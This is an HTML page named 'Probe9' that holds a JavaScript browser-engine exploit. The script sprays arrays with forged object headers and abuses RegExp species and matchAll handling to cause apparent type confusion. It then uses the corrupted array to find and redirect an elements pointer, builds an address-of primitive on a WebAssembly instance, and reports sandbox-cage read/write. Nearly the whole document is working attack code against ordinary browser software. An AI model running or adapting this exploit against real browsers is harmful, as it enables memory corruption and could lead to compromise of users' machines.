<!doctype html>
<html><head><meta charset="utf-8"><title>Probe9</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}

const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1080011,MAXS=0x7fdffffe;
const pinnedDoubles=new Array(0x8000);
for(let i=0;i<pinnedDoubles.length;i++)pinnedDoubles[i]=10.125+i*0.001;
const pinnedObjects=new Array(0x8000);
for(let i=0;i<pinnedObjects.length;i++)pinnedObjects[i]=null;
const victim=[1.22,1.33,1.44];
const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
const sk=[];
function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
log("UA: "+navigator.userAgent);
trash(230);trash(230);
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
spray();spray();spray();

try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));
if(Array.isArray(m)){
  log("L: "+m.length);

  // Search for master's header [DMAP|EMPTY, PIN|MAXS] pattern
  // PIN=0x1080011, MAXS=0x7fdffffe
  // The elements+length QWORD = 0x7fdffffe_01080011
  const targetElemLen=0x7fdffffe01080011n;
  let headerIdx=-1;
  const results=[];
  for(let k=0x7FF0;k<=0x800F;k++){
    try{
      const v=f2i(m[k]);
      results.push(k.toString(16)+":"+v.toString(16).padStart(16,"0"));
      if(v===targetElemLen){headerIdx=k;}
    }catch(e){results.push(k.toString(16)+":ERR");break;}
  }
  log("H: "+results.slice(0,8).join(","));

  if(headerIdx>=0){
    log("HDR@"+headerIdx.toString(16));
    // SELF-MODIFY: change elements to pinnedDoubles marker scan
    const origVal=f2i(m[headerIdx]);

    // Write marker to pinnedDoubles
    pinnedDoubles[0]=i2f(0xCAFE1234DEAD5678n);

    // Try redirect to 0x1100011 (known committed)
    m[headerIdx]=i2f((BigInt(MAXS)<<32n)|0x1100011n);
    const at1100=f2i(m[0]).toString(16);

    // Restore and try another
    m[headerIdx]=i2f(origVal);

    pinnedDoubles[0]=10.125;
    log("@1100011_m0: "+at1100);

    // Now scan for pinnedDoubles: write marker, try addresses
    pinnedDoubles[0]=i2f(0xCAFE1234DEAD5678n);
    let pdAddr=0n;
    const scanned=[];
    for(const a of [0x1100011n,0x1120011n,0x1140011n,0x1160011n,0x1180011n,0x11a0011n,0x11c0011n,0x1200011n]){
      m[headerIdx]=i2f((BigInt(MAXS)<<32n)|a);
      try{
        const v=f2i(m[0]);
        if(v===0xCAFE1234DEAD5678n){pdAddr=a;scanned.push(a.toString(16)+"=HIT");break;}
        scanned.push(a.toString(16)+"="+Number(v&0xffn).toString(16));
      }catch(e){scanned.push(a.toString(16)+"=E");break;}
    }
    m[headerIdx]=i2f(origVal);
    pinnedDoubles[0]=10.125;
    log("PD_SCAN: "+scanned.join(","));

    if(pdAddr>0n){
      log("PD@"+pdAddr.toString(16));
      // ADDROF
      m[headerIdx]=i2f((BigInt(MAXS)<<32n)|pdAddr);
      pinnedDoubles[0]=wasmI;
      const raw=f2i(m[0]);
      pinnedDoubles[0]=10.125;
      m[headerIdx]=i2f(origVal);
      log("WASM@"+(raw&0xffffffffn).toString(16));
      if((raw&0xffffffffn)>0x1000n)log("ADDROF_OK");
    }

    log("W: "+wasmI.exports.f());
  }else{
    log("HDR_NOT_FOUND");
  }

  log("CAGE_RW_OK");
}else{log("NO_ARR");}
}catch(e){log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
